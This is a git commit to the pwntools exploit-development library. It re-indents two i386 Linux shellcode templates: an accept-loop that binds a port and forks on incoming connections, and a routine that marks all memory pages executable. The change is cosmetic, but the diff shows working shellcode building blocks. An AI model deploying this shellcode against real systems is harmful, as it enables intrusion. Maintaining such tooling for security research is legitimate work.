9536b17e5ab65750bbd00a205261b8bb5b46762e
MengHuan Yu <cebrusfs@gmail.com>
2015-03-26 01:38:41 +0800

    Fix the coding style in 2 shellcraft examples
    Use 4 space indent in 'i386/linux/acceptloop_ipv4.asm' and
    'i386/linux/mprotect_all.asm'
    
    BUG=None
    TEST=None

--- pwnlib/shellcraft/templates/i386/linux/acceptloop_ipv4.asm
+++ pwnlib/shellcraft/templates/i386/linux/acceptloop_ipv4.asm
@@ -1,63 +1,64 @@
 <%
-  from pwnlib.shellcraft import common
-  from pwnlib.shellcraft import i386
-  from socket import htons
+    from pwnlib.shellcraft import common
+    from pwnlib.shellcraft import i386
+    from socket import htons
 %>
 <%page args="port"/>
 <%docstring>
-    Args: port
+    Args:
+        port(int): the listening port
     Waits for a connection.  Leaves socket in EBP.
     ipv4 only
 </%docstring>
 <%
-  acceptloop = common.label("acceptloop")
-  looplabel = common.label("loop")
+    acceptloop = common.label("acceptloop")
+    looplabel = common.label("loop")
 %>
 
 ${acceptloop}:
-        /*  Listens for and accepts a connection on ${int(port)}d forever */
-        /*  Socket file descriptor is placed in EBP */
+    /*  Listens for and accepts a connection on ${int(port)}d forever */
+    /*  Socket file descriptor is placed in EBP */
 
-        /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
-        ${i386.linux.push(0)}
-        ${i386.linux.push('SOCK_STREAM')}
-        ${i386.linux.push('AF_INET')}
-        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_socket', 'esp')}
+    /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
+    ${i386.linux.push(0)}
+    ${i386.linux.push('SOCK_STREAM')}
+    ${i386.linux.push('AF_INET')}
+    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_socket', 'esp')}
 
-        ${i386.linux.mov('esi', 'eax')}      /* keep socket fd */
+    ${i386.linux.mov('esi', 'eax')}      /* keep socket fd */
 
-        /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
-        ${i386.linux.push(0)}
-        /* ${htons(port)} == htons(${port}) */
-        ${i386.linux.push('AF_INET | (%d << 16)' % htons(port))}
-        ${i386.linux.mov('ecx', 'esp')}
+    /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
+    ${i386.linux.push(0)}
+    /* ${htons(port)} == htons(${port}) */
+    ${i386.linux.push('AF_INET | (%d << 16)' % htons(port))}
+    ${i386.linux.mov('ecx', 'esp')}
 
-        ${i386.linux.push(0x10)}    /* sizeof addr */
-        ${i386.linux.push('ecx')}   /* &addr */
-        ${i386.linux.push('eax')}   /* sock */
-        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_bind', 'esp')}
+    ${i386.linux.push(0x10)}    /* sizeof addr */
+    ${i386.linux.push('ecx')}   /* &addr */
+    ${i386.linux.push('eax')}   /* sock */
+    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_bind', 'esp')}
 
-        /*  listen(sock, whatever) */
-        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_listen')}
+    /*  listen(sock, whatever) */
+    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_listen')}
 
 
 ${looplabel}:
-        /*  accept(sock, NULL, NULL) */
-        ${i386.linux.push(0x0)}
-        ${i386.linux.push('esi')} /* sock */
-        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_accept', 'esp')}
+    /*  accept(sock, NULL, NULL) */
+    ${i386.linux.push(0x0)}
+    ${i386.linux.push('esi')} /* sock */
+    ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_accept', 'esp')}
 
-        ${i386.linux.mov('ebp', 'eax')}      /* keep in-comming socket fd */
+    ${i386.linux.mov('ebp', 'eax')}      /* keep in-comming socket fd */
 
-        ${i386.linux.syscall('SYS_fork')}
-        xchg eax, edi
+    ${i386.linux.syscall('SYS_fork')}
+    xchg eax, edi
 
-        test edi, edi
-        ${i386.linux.mov('ebx', 'ebp')}
-        cmovz ebx, esi /*  on child we close the server sock instead */
+    test edi, edi
+    ${i386.linux.mov('ebx', 'ebp')}
+    cmovz ebx, esi /*  on child we close the server sock instead */
 
-        /*  close(sock) */
-        ${i386.linux.syscall('SYS_close', 'ebx')}
+    /*  close(sock) */
+    ${i386.linux.syscall('SYS_close', 'ebx')}
 
-        test edi, edi
-        jnz ${looplabel}
+    test edi, edi
+    jnz ${looplabel}
--- pwnlib/shellcraft/templates/i386/linux/mprotect_all.asm
+++ pwnlib/shellcraft/templates/i386/linux/mprotect_all.asm
@@ -1,15 +1,16 @@
 <%
-  from pwnlib.shellcraft import common
-  from pwnlib.shellcraft import i386
+    from pwnlib.shellcraft import common
+    from pwnlib.shellcraft import i386
 %>
 <%page args="clear_ebx = True, fix_null = False"/>
-<%docstring>Calls mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) for every page.
+<%docstring>
+    Calls mprotect(page, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) for every page.
 
-It takes around 0.3 seconds on my box, but your milage may vary.
+    It takes around 0.3 seconds on my box, but your milage may vary.
 
-Args:
-  clear_ebx(bool): If this is set to False, then the shellcode will assume that ebx has already been zeroed.
-  fix_null(bool): If this is set to True, then the NULL-page will also be mprotected at the cost of slightly larger shellcode
+    Args:
+        clear_ebx(bool): If this is set to False, then the shellcode will assume that ebx has already been zeroed.
+        fix_null(bool): If this is set to True, then the NULL-page will also be mprotected at the cost of slightly larger shellcode
 </%docstring>
 <% label = common.label("mprotect_loop") %>
 
